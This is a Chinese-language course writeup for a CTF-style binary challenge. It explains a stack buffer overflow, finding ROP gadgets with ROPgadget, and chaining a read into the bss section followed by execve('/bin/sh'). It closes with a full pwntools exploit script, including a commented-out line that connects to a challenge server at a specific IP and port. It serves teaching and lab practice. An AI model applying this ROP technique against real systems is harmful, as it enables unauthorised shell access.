# NIS4355 信息安全综合实践（2）课程writeup

[TOC]

## 1stStep

`NX enabled`：数据段和堆栈不可执行

read函数读入长度为256，超过缓冲区大小，栈溢出

使用ROPgadget工具寻找寄存器地址

```shell
ROPgadget --binary ./1stStep | grep "pop rdi ; ret"
ROPgadget --binary ./1stStep --only "pop|ret"
```

Linux x86_64通常前6个参数通过寄存器
rdi,rsi,rdx,rcx,r8,r9传递，从第7个参数开始在栈上

通过ROP执行Linux 64位程序系统调用

execve(“/bin/sh”, 0, 0) ⇒
1. 使rax 为execve 系统调用号0x3b
2. 使rdi 为”/bin/sh” 字符串地址
3. 使rsi 和rdx 为0
4. syscall指令

考虑将shell指令读入，观察read函数原型

`ssize_t read(int fd, void *buf, size_t count);`

rdi 填充 0	rsi填充bss地址	rdx填入字符串“/bin/sh”长度8

寄存器填充解释

`pop_rdi`：第一次进行read填充，第二次读入bss

`pop_rsi`：第一次填充bss地址，第二次填充0

`pop_rdx`：填充字符串长度

`pop_rax_rdx_rbx`:rax用以读入系统调用指令，其余寄存器填充0

`syscall`：代码中有很多syscall的调用，这里选用调用Linux-time的地址

- 第一次触发漏洞： ROP调用Read函数
- 向可写位置读入“/bin/sh”字符串，通常可以选用bss区域；
- 再次回到漏洞函数
-  第二次触发漏洞：ROP调用execve函数
-  设置rax, rdi, rsi, rdx
- 执行syscall调用 execve("/bin/sh", 0, 0)

exp

```python
from pwn import *
# p = remote('111.186.57.85', 10312)
context.arch = 'amd64'
p = process(["./1stStep"])
# syscall = 0x40046B 0x400412
syscall = 0x43f435
pop_rdi = 0x4016e6
pop_rsi = 0x401807
pop_rdx = 0x4432a6
pop_rax_rdx_rbx = 0x479156
read = 0x43FDF0
bss = 0x6ccc40
vuln = 0x400A6C
p.recvuntil(b'Go explore and exploit here\x1B[0m\n')
payload1 = flat(b'a' * 0x20, b'b' * 8, pop_rdi, 0, pop_rsi, bss, pop_rdx, 8, read, vuln)
p.sendline(payload1)
p.send(b'/bin/sh\x00')
payload2 = flat(b'a' * 0x20, b'b' * 8, pop_rdi, bss, pop_rax_rdx_rbx, 0X3b, 0, 0, pop_rsi, 0, syscall)
p.sendline(payload2)
p.interactive()
```

